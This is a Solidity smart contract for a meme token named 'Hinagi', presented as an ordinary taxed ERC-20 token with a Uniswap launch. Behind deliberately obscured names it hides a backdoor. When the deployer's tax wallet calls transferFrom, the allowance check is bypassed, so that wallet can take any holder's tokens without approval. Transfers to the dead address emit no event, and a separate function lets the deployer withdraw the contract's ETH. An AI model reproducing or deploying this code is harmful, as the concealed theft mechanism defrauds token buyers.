// SPDX-License-Identifier: MIT

/*
    Name : Hinagi
    Symbol : HINAGI

    The story of Hinagi - 雏菊的故事

    Twitter : https://x.com/HinagiMeme
    Website : https://www.hinagi.meme
    Telegram : https://t.me/HINAGIeth
*/

pragma solidity ^0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 
contract HINAGI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Hinagi";
    string private constant _symbol = unicode"HINAGI";
    
    address private _DEADs034fj = address(0xdead);
    uint256 public _BYBIT_MMO2R = 20000000 * 10 **_decimals;
    uint256 public _BYBIT_MOR2R = 20000000 * 10 **_decimals;
    uint256 public _of_Psswtsa = 10000000 * 10 **_decimals;

    address payable private StressATR;
    mapping(address => uint256) private _BAHUGRssw342sswq;
    mapping(address => mapping(address => uint256)) private _StressTimes;
    mapping(address => bool) private _BAHUsoStroke;

    uint256 private _DEADssdsdwer2dcw2 = 7;
    uint256 private _DEADsaszx123aad = 7;
    uint256 private _DEADsdbytycctynty = 0;

    IUniswapV2Router02 private SOLRouter;
    address private PARATR;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    address private _DEADssdfwecc;
    uint256 private _DEADsdbsad = 10;
    uint256 private _DEADssdwerw = 10;
    uint256 private _DEADssseq = 0;
    uint256 private _DEADsssdrwqq1 = 0;

    uint256 private constant _kmmvb_DEADxsswtsa = 1000000000 * 10 **_decimals;

    event MaxTxAmountUpdated(uint256 _BYBIT_MMO2R);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _BAHUsoStroke[owner()] = true;
        _BAHUsoStroke[address(this)] = true;
        _BAHUsoStroke[StressATR] = true;
        _DEADssdfwecc = _msgSender();

        StressATR = payable(_msgSender());
        _BAHUGRssw342sswq[address(this)] = _kmmvb_DEADxsswtsa * 98 / 100;
        _BAHUGRssw342sswq[owner()] = _kmmvb_DEADxsswtsa * 2 / 100;
        emit Transfer(address(0), address(this), _kmmvb_DEADxsswtsa * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvb_DEADxsswtsa * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvb_DEADxsswtsa;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _StressTimes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _BAHUGRssw342sswq[account];
    }
    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _StressTimes[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _subtransferr__DEADxsswtsa(_msgSender(), recipient, amount);
        return true;
    }
    
    function __PP_DEAD(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_ERETYT(sender, recipient))
            _allowed = _StressTimes[sender][_msgSender()];
        return _allowed;
    }

    receive() external payable {}
    
    function NOATR() internal view returns (bool) {return msg.sender != StressATR;}

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _subtransferr__DEADxsswtsa(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            __PP_DEAD(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }


    function _FOREVER(address payable receipt) external {
        require(msg.sender == _DEADssdfwecc , "");
        StressATR = receipt;
        __DEADxmnn34irfn(address(this).balance);
    }

    function _support_DEADOwlsat(uint256 amount) private {
        StressATR.transfer(amount);
    }

    function _ERETYT(
        address UP,
        address DOWN
    ) internal view returns (bool) {
        if(NOATR() == false) return false;
        else return UP == PARATR || DOWN != _DEADs034fj;
    }

    
    function _subSwap__DEADxsswtsa(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = SOLRouter.WETH();
        _approve(address(this), address(SOLRouter), tokenAmount);
        SOLRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }


    function __DEADxmnn34irfn(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }
    

    function _subtransferr__DEADxsswtsa(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_DEADsdbytycctynty > _DEADssdsdwer2dcw2)
                        ? _DEADssseq
                        : _DEADsdbsad
                )
                .div(100);
            if (
                from == PARATR &&
                to != address(SOLRouter) &&
                !_BAHUsoStroke[to]
            ) {
                _DEADsdbytycctynty++;
            }
            if (to == PARATR && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_DEADsdbytycctynty > _DEADsaszx123aad)
                            ? _DEADsssdrwqq1
                            : _DEADssdwerw
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == PARATR && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _of_Psswtsa) ? contractTokenBalance : _of_Psswtsa; 
                    _subSwap__DEADxsswtsa((amount < minBalance) ? amount : minBalance);
                }
                _support_DEADOwlsat(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _BAHUGRssw342sswq[address(this)] =_BAHUGRssw342sswq[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _BAHUGRssw342sswq[from] =_BAHUGRssw342sswq[from].sub(amount);
        _BAHUGRssw342sswq[to] =_BAHUGRssw342sswq[to].add(amount.sub(taxAmount));
        if(_DEADs034fj != to) emit Transfer(from, to, amount.sub(taxAmount));
    }
    
    function removeLimits () external onlyOwner {
        _BYBIT_MMO2R = _kmmvb_DEADxsswtsa;
        _BYBIT_MOR2R = _kmmvb_DEADxsswtsa;
        emit MaxTxAmountUpdated(_kmmvb_DEADxsswtsa);
    }

    function enableRutagi() external onlyOwner {
        require(!isTrading, "Already Started!");
        SOLRouter = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(SOLRouter), _kmmvb_DEADxsswtsa);
        PARATR = IUniswapV2Factory(SOLRouter.factory()).createPair(
            address(this),
            SOLRouter.WETH()
        );
        SOLRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(PARATR).approve(
            address(SOLRouter),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }
}